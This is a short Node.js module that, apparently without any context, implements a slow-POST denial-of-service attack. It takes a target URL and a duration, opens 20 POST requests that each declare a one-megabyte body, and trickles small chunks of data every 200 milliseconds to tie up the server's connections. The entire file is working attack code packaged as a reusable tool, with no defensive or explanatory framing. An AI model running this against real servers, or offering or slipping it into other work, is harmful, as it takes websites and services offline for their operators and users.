
const http = require("http");

module.exports = function (target, duration) {
  const end = Date.now() + duration * 1000;
  const { hostname, port = 80, pathname } = new URL(target);

  function send() {
    const req = http.request({
      hostname,
      port,
      path: pathname || "/",
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": 1000000
      }
    });
    let written = 0;
    const chunk = "A".repeat(1000);
    const interval = setInterval(() => {
      if (written >= 1000000 || Date.now() >= end) {
        clearInterval(interval);
        req.end();
        return;
      }
      req.write(chunk);
      written += chunk.length;
    }, 200);
  }

  for (let i = 0; i < 20; i++) send();
};
